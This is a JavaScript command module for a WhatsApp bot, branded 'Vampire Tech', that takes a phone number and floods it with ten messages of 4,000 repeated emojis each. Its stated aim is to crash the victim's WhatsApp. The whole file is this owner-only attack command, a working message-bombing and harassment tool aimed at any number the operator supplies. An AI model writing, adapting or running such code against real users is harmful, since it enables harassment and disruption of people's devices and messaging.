export default {
  name: 'crash',
  description: 'Send crash text to crash WhatsApp',
  category: 'bug',
  aliases: ['bugcrash', 'crashwa'],
  ownerOnly: true,
  async execute(sock, msg, args) {
    const chatId = msg.key.remoteJid;
    const target = args[0]?.replace(/[^0-9]/g, '');
    
    if (!target) return sock.sendMessage(chatId, { text: '❌ .crash <number>\nExample: .crash 27687813781' }, { quoted: msg });
    
    const targetJid = target + '@s.whatsapp.net';
    const crashText = '🧛'.repeat(5000); // 5000 vampire emojis
    
    await sock.sendMessage(chatId, { text: `💣 *CRASHING +${target}...*\nSending 10 crash messages...` }, { quoted: msg });
    
    for (let i = 0; i < 10; i++) {
      try {
        await sock.sendMessage(targetJid, { text: crashText.substring(0, 4000) });
        await new Promise(r => setTimeout(r, 500));
      } catch(e) {}
    }
    
    await sock.sendMessage(chatId, { text: `✅ *CRASHED +${target}!*\n10 crash messages sent!\n\n⚡ *Vampire Tech* 🧛` }, { quoted: msg });
  }
};
